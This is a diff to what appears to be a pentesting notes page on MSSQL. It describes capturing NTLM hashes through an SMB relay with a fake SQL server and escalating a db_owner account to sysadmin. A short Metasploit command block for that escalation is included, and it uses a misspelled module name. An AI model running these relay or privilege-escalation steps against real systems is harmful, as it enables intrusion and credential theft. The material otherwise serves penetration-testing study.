@@ -149,11 +149,45 @@ mysql -h <Hostname> -u user@target-host
 
 ![](<../../.gitbook/assets/image (276).png>)
 
-## NTLM Service Hash Gathering
+## MSSQL - SMB Relay Attack
 
 If we are in the local network we can run an MitM attack and grab NTLM hashes by setting up a fake SQL server and making the service authenticate against our server.
 
 {% embed url="https://www.netspi.com/blog/technical/network-penetration-testing/executing-smb-relay-attacks-via-sql-server-using-metasploit" %}
+
+## Stored Procedures (db\_owner to sysadmin)
+
+#### if we have the credentials of a DB user we can become sysadmin and execute commands remotely:
+
+{% embed url="https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases" %}
+
+### Metasploit
+
+```
+use auxiliary/admin/mssql/mssql_esclate_dbowner
+set rhost 172.20.10.2
+set rport 1433
+set username db1_owner
+set password MyPassword!
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
